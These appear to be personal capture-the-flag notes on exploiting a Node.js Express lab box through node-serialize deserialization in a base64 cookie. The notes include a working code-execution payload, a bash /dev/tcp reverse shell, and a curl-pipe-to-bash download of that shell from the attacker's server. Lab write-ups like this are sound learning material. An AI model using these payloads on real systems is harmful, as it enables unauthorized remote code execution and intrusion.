Only port 3000 is visible
Nodejs Express Framework

When trying to access the page: 10.10.10.85:3000
-> blank page with the 404
<h1>404</h1>

trying with 10.10.10.85:3000/index.html/php/js
-> cannot get /index.*

10.10.10.85:3000/
-> Site returns: Hey Dummy 2 + 2 is 22 -> lulz just JS things.
Through Burp: it shows:

'''
HTTP/1.1 304 Not Modified
X-Powered-By: Express
ETag: W/"15-iqbh0nIIVq2tZl3LRUnGx4TH3xg"
Date: Wed, 16 Sep 2020 13:54:28 GMT
Connection: close
'''

So far I don't think I'm getting anything from gobuster
tried scanning for sub directories and files with .js extension

we also got assigned a cookie:
eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
urldecoded:
eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==
B64 decoded:
we now have a JSON object
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
if we change "num":"13"
base64 encoded -> urlencoded -> paste to repeater and send the req
we now have:
Hey Dummy 13 + 13 is 1313

--> Possible attack vector, input that we have control over

After some googling on nodejs serialisation:
Install node-serialisation lib: npm install node-serialize
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

exploited crafted: payload2.js
when run: node payload2.js
We get the JSON serialized output:
{"username":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}()","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}

Convert this to base64 and send to repeater -> urlencoded -> invalid username type
I was stuck here and had to look for help and tips:
Had to slightly modify the serialized payload:

{"username":"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}

B64 encode -> send to repeater -> urlencode
Now the server interpretes username as an object, test for RCE by sending a ping to the local machine.
set up icmp listerner: sudo tcpdump icmp
Modify the serialized payload:

{"username":"_$$ND_FUNC$$_require('child_process').exec('ping -c 3 10.10.14.29', function(error, stdout, stderr) { console.log(stdout) })","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}

we get 3 ping requests from the tcpdump -> RCE confirmed!

Craft a tcp reverse shell: shell.sh
bash -i >& /dev/tcp/10.10.14.29/6969 0>&1

set up a http server: python3 -m http.server 8888

Modify the payload to grab this shell script via curl then pipe it to bash.

{"username":"_$$ND_FUNC$$_require('child_process').exec('curl 10.10.14.29:8888/shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) })","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}

for some reason wget didn't work but curl does? weird.

Set up a netcat listener: nc -lvnp 6969
Shell popped!
sun@sun
find / -type f -name user.txt
user.txt is located at /home/sun/Documents/
user pwned!


-----------------------------------------------------------------------------------------






